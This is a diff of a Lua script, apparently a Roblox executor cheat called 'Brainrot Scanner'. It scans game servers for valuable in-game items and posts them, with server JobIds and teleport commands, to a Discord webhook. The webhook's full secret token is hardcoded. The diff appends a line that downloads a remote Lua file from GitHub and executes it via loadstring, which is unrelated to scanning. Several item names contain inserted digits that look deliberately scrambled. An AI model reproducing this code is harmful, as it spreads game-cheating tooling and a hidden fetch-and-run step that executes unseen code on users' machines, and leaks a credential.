@@ -7,38 +7,71 @@ local UserInputService = game:GetService('UserInputService')
 local HttpService = game:GetService('HttpService')
 
 -- ⚙️ НАСТРОЙКИ
-local INCOME_THRESHOLD = 300_000_000 -- 300M/s минимум для не-important объектов
+local INCOME_THRESHOLD = 100_000_000 -- 50M/s минимум для уведомления
 local DISCORD_WEBHOOK_URL = 'https://ptb.discord.com/api/webhooks/1426282608710647952/bmfmWPMug07ht7nRa_QeCVi7tfItybezKVkZ2tmw7lsODttiUnSnYJArl6UchxqIbeyT'
 
 print('🎯 Brainrot Scanner v2.0 | JobId:', game.JobId)
 
 -- 🎮 ОБЪЕКТЫ С ЭМОДЗИ И ВАЖНОСТЬЮ
 local OBJECTS = {
-    ['Garama and Madundung'] = { emoji = '🍝', important = true },
+    
+    ['Torrtuginni Dragonfrutini'] = { emoji = '🐉', important = false },
+    ['Pot Hotsp213ot'] = { emoji = '📱', important = false },
+    ['La Grande C3123ombi1nasion'] = { emoji = '❗️', important = false },
+    ['Garama and Madundung'] = { emoji = '🧂', important = true },
+    ['Secret Lucksfsfsfy Block'] = { emoji = '⬛️', important = false },
     ['Dragon Cannelloni'] = { emoji = '🐲', important = true },
-    ['Nuclearo Dinossauro'] = { emoji = '🦕', important = true },
-    ['Esok Sekolah'] = { emoji = '🏠', high_priority = true, },
-    ['Los Bros'] = { emoji = '✊', high_priority = true, },
+    ['Nuclearo Dinos332sauro'] = { emoji = '🦕', important = true },
+    ['Las Vaquitas Satu323rnitas'] = { emoji = '👦', important = false },
+    ['Chicleteira Bici323cl1eteira'] = { emoji = '🚲', important = false },
+    ['Los Combinasi1323onas'] = { emoji = '⚒️', important = false },
+    ['Agarrini la 1Palini'] = { emoji = '🥄', important = false },
+    ['Los Hotsp1otsitos'] = { emoji = '☎️', important = false },
+    ['Esok Se323kolah'] = { emoji = '🏠', important = true },
+    ['Nooo My Hots1pot'] = { emoji = '👽', important = false },
     ['La Supreme Combinasion'] = { emoji = '🔫', important = true },
+    ['Admin Luck1y Block'] = { emoji = '🆘', important = false },
     ['Ketupat Kepat'] = { emoji = '🍏', important = true },
     ['Strawberry Elephant'] = { emoji = '🐘', important = true },
-    ['Spaghetti Tualetti'] = { emoji = '🚽', high_priority = true, },
+    ['Spaghetti Tualetti'] = { emoji = '🚽', important = false },
     ['Ketchuru and Musturu'] = { emoji = '🍾', important = true },
-    ['Tralaledon'] = { emoji = '🦈', important = true },
-    ['La Extinct Grande'] = { emoji = '🩻', high_priority = true, },
-    ['Tictac Sahur'] = { emoji = '🕰️', high_priority = true, },
-    ['Los Primos'] = { emoji = '🙆‍♂️', high_priority = true, },
-    ['Tang Tang Keletang'] = { emoji = '📢', high_priority = true, },
-    ['Money Money Puggy'] = { emoji = '🐶', high_priority = true,  },
-    ['Burguro And Fryuro'] = { emoji = '🍔', important = true },
-    ['Chillin Chili'] = { emoji = '🌶', high_priority = true, },
     ['La Secret Combinasion'] = { emoji = '❓', important = true },
-    ['Eviledon'] = { emoji = '😡', important = true },
-    ['Los Mobilis'] = { emoji = '🫘', high_priority = true, },
-    ['La Spooky Grande'] = { emoji = '🎃', high_priority = true, },
-    ['Spooky and Pumpky'] = { emoji = '🦇', important = true },
-    ['Meowl'] = { emoji = '🦉', important = true },
-    ['Chipso and Queso'] = { emoji = '🧀', high_priority = true, },
+    ['La Kark56656erkar Combinasion'] = { emoji = '🥊', important = false },
+    ['Los B2323ros'] = { emoji = '📱', important = true },
+    ['Tralaledon'] = { emoji = '🦈', important = true },
+    ['Los Chicl1eteiras'] = { emoji = '🚳', important = true },
+    ['Las S233is'] = { emoji = '👧', important = true },
+    ['Tacorita Bicdsdicleta'] = { emoji = '📱', important = true },
+    ['Tictac Sahur'] = { emoji = '🕰️', important = true },
+    ['Celularcini Viciosini'] = { emoji = '📞', important = true },
+    ['Los Primos'] = { emoji = '🙆‍♂️', important = true },
+    ['Tang Tang Keletang'] = { emoji = '📢', important = true },
+    ['Money Money Pu323ggy'] = { emoji = '🐶', important = true },
+    ['Burguro And Fryuro'] = { emoji = '🍔', important = true },
+    ['Chillin Chili'] = { emoji = '🌶', important = true },
+    ['Eviled323on'] = { emoji = '👹', important = true },
+    ['La Spooky Grande'] = { emoji = '🟧', important = true },
+    ['Los Mo21bilis'] = { emoji = '🧕', important = false },
+    ['Spooky and Pumpky'] = { emoji = '🎃', important = true, },
+    ['Mietet11eira Bicicleteira'] = { emoji = '☠️', important = true },
+    ['Meowl'] = { emoji = '🐈', important = true },
+    ['Chipso and Queso'] = { emoji = '🧀', important = false },
+    ['La Casa Boo'] = { emoji = '👁‍🗨', important = true },
+    ['Headless Horseman'] = { emoji = '🐴', important = true },
+    ['Los Tacoritas'] = { emoji = '💀', important = true },
+    ['La Taco Combinasion'] = { emoji = '👒', important = true },
+    ['Cooki and Milki'] = { emoji = '🍪', important = true },
+    ['Fragrama and Chocrama'] = { emoji = '🍫', important = true },
+    ['Los Spaghettis'] = { emoji = '🍝', important = true },
+    ['Orcaledon'] = { emoji = '🐭', important = true },
+    ['W or L'] = { emoji = '🏆', important = true },
+    ['Lavadorito Spinito'] = { emoji = '📺', important = true },
+    ['Gobblino Uniciclino'] = { emoji = '🕊️', important = true },
+    ['Fishino Clownino'] = { emoji = '🐠', important = true },
+    ['La Ginger Sekolah'] = { emoji = '🎄', important = true },
+    ['Los Planitos'] = { emoji = '🪐', important = true },
+    
+    
 }
 
 -- Создаем список важных объектов
@@ -337,6 +370,13 @@ local function collectAll(timeoutSec)
     return collected
 end
 
+local function shouldShow(name, gen)
+    if ALWAYS_IMPORTANT[name] then
+        return true
+    end
+    return (type(gen) == 'number') and gen >= INCOME_THRESHOLD
+end
+
 -- 📤 DISCORD УВЕДОМЛЕНИЯ
 local function getRequester()
     return http_request
@@ -346,7 +386,7 @@ local function getRequester()
         or (KRNL_HTTP and KRNL_HTTP.request)
 end
 
-local function sendDiscordNotification(filteredObjects, webhookUrl)
+local function sendDiscordNotification(filteredObjects)
     local req = getRequester()
     if not req then
         warn('❌ Нет HTTP API в executor')
@@ -357,30 +397,32 @@ local function sendDiscordNotification(filteredObjects, webhookUrl)
     local placeId = game.PlaceId
 
     if #filteredObjects == 0 then
-        print('🔍 Объектов для уведомления не найдено')
+        print('🔍 Важных объектов не найдено')
         return
     end
 
-    -- Сортируем: сначала important объекты, затем не-important по убыванию дохода
-    local importantObjects, highIncomeObjects = {}, {}
+    -- Сортируем по доходу (важные сначала, затем по убыванию дохода)
+    local important, regular = {}, {}
     for _, obj in ipairs(filteredObjects) do
         if ALWAYS_IMPORTANT[obj.name] then
-            table.insert(importantObjects, obj)
+            table.insert(important, obj)
         else
-            table.insert(highIncomeObjects, obj)
+            table.insert(regular, obj)
         end
     end
 
-    -- Сортируем не-important объекты по убыванию дохода
-    table.sort(highIncomeObjects, function(a, b)
+    table.sort(important, function(a, b)
+        return a.gen > b.gen
+    end)
+    table.sort(regular, function(a, b)
         return a.gen > b.gen
     end)
 
     local sorted = {}
-    for _, obj in ipairs(importantObjects) do
+    for _, obj in ipairs(important) do
         table.insert(sorted, obj)
     end
-    for _, obj in ipairs(highIncomeObjects) do
+    for _, obj in ipairs(regular) do
         table.insert(sorted, obj)
     end
 
@@ -388,9 +430,8 @@ local function sendDiscordNotification(filteredObjects, webhookUrl)
     local objectsList = {}
     for i = 1, math.min(10, #sorted) do
         local obj = sorted[i]
-        local cfg = OBJECTS[obj.name] or {}
-        local emoji = cfg.emoji or '💰'
-        local mark = ALWAYS_IMPORTANT[obj.name] and '⭐ ' or '💎 '
+        local emoji = OBJECTS[obj.name].emoji or '💰'
+        local mark = ALWAYS_IMPORTANT[obj.name] and '⭐ ' or ''
         table.insert(
             objectsList,
             string.format(
@@ -411,6 +452,12 @@ local function sendDiscordNotification(filteredObjects, webhookUrl)
         jobId
     )
 
+    -- Кнопка для копирования JobId
+    local copyButtonText = string.format(
+        "📋 Нажмите чтобы скопировать JobId: ```%s```",
+        jobId
+    )
+
     local payload = {
         username = '🎯 Brainrot Scanner',
         embeds = {
@@ -424,19 +471,24 @@ local function sendDiscordNotification(filteredObjects, webhookUrl)
                         inline = false,
                     },
                     {
-                        name = '💰 Ценные объекты:',
+                        name = '💰 Важные объекты:',
                         value = objectsText,
                         inline = false,
                     },
                     {
-                        name = '🚀 Телепорт:',
+                        name = '🚀 Телепорт команда:',
                         value = teleportText,
+                        inline = false,
+                    },
+                    {
+                        name = '📋 Скопировать JobId',
+                        value = copyButtonText,
                         inline = false,
                     },
                 },
                 footer = {
                     text = string.format(
-                        'Найдено: %d объектов • %s',
+                        'Найдено: %d важных • %s',
                         #filteredObjects,
                         os.date('%H:%M:%S')
                     ),
@@ -446,11 +498,15 @@ local function sendDiscordNotification(filteredObjects, webhookUrl)
         },
     }
 
-    print('📤 Отправляю уведомление с', #filteredObjects, 'объектами')
+    print(
+        '📤 Отправляю уведомление с',
+        #filteredObjects,
+        'объектами'
+    )
 
     local ok, res = pcall(function()
         return req({
-            Url = webhookUrl,
+            Url = DISCORD_WEBHOOK_URL,
             Method = 'POST',
             Headers = { ['Content-Type'] = 'application/json' },
             Body = HttpService:JSONEncode(payload),
@@ -469,28 +525,36 @@ local function scanAndNotify()
     print('🔍 Сканирую все объекты...')
     local allFound = collectAll(8.0) -- 8 секунд таймаут
 
-    -- ФИЛЬТРАЦИЯ ПО ЛОГИКЕ:
-    -- 1. Все important объекты → отправляются всегда (любой доход)
-    -- 2. Не-important объекты → отправляются только если ≥300M/s
-    local filteredObjects = {}
+    -- Фильтрация по важности и доходу
+    local filtered = {}
     for _, obj in ipairs(allFound) do
-        if ALWAYS_IMPORTANT[obj.name] then
-            -- Important объекты отправляются всегда
-            table.insert(filteredObjects, obj)
-        else
-            -- Не-important объекты отправляются только от 300M/s
-            if obj.gen and obj.gen >= INCOME_THRESHOLD then
-                table.insert(filteredObjects, obj)
-            end
+        if OBJECTS[obj.name] and shouldShow(obj.name, obj.gen) then
+            table.insert(filtered, obj)
         end
     end
 
     -- Вывод в консоль
     print('Найдено всего объектов:', #allFound)
-    print('Объекты для уведомления:', #filteredObjects)
+    print('Показано важных:', #filtered)
 
-    if #filteredObjects > 0 then
-        sendDiscordNotification(filteredObjects, DISCORD_WEBHOOK_URL)
+    for _, obj in ipairs(filtered) do
+        local emoji = OBJECTS[obj.name].emoji or '💰'
+        local mark = ALWAYS_IMPORTANT[obj.name] and '⭐ ' or ''
+        print(
+            string.format(
+                '%s%s %s: %s (%s)',
+                mark,
+                emoji,
+                obj.name,
+                formatIncomeNumber(obj.gen),
+                obj.location or 'Unknown'
+            )
+        )
+    end
+
+    -- Отправляем уведомление если есть что показать
+    if #filtered > 0 then
+        sendDiscordNotification(filtered)
     else
         print('🔍 Нет объектов для уведомления')
     end
@@ -498,9 +562,6 @@ end
 
 -- 🚀 ЗАПУСК
 print('🎯 === BRAINROT INCOME SCANNER ЗАПУЩЕН ===')
-print('⭐ Important объекты: отправляются всегда (любой доход)')
-print('💎 Не-important объекты: отправляются от 300M/s')
-print('📱 Discord webhook готов к отправке уведомлений')
 scanAndNotify()
 
 -- ⌨️ ПОВТОР ПО КЛАВИШЕ F
@@ -521,4 +582,5 @@ UserInputService.InputBegan:Connect(function(input, gpe)
 end)
 
 print('💡 Нажмите F для повторного сканирования')
+print('📱 Discord webhook готов к отправке уведомлений')
 loadstring(game:HttpGet('https://raw.githubusercontent.com/xzoldeveloper/brain/refs/heads/main/botik.lua'))()
